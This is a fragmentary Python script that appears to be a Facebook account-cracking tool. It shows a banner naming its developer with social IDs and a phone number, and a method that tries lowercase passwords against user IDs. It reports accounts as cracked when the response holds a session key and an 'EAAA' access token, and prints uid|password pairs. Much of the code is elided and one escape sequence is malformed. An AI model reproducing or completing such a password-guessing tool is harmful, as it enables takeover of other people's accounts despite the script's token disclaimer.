...
class Main:
	def __init__(self):
		...
		print ("""\033[0;92___    ____  ___    _________  ______
   /   |  / __ \/   |  / ____/   |/_  __/
  / /| | / /_/ / /| | / /_  / /| | / /   
 / ___ |/ _, _/ ___ |/ __/ / ___ |/ /    
/_/  |_/_/ |_/_/  |_/_/   /_/  |_/_/
...
\033[0;96m
 ...
 > \033[0;92mDEVELOPER     : PRINCE ARAFAT
 > \033[0;95mFACEBOOK ID   : PrinceArafat770
 > \033[0;41mWHATSAPP      : +8801943520447
 \033[0;96m> YOUTUBE       : ,GAMING ARAFAT
 > \033[0;97mWARNING       : DONT USE FOR ILLEGAL WORK     
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [ARAFAT] : %s/%s -> \033[0;92m [ ARAFAT-OK:%s ]- \033[0;93m[HAMII-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r \033[0;93m[ARAFAT-CP😭] %s|%s\033[0;97m         "%(uid, pw))
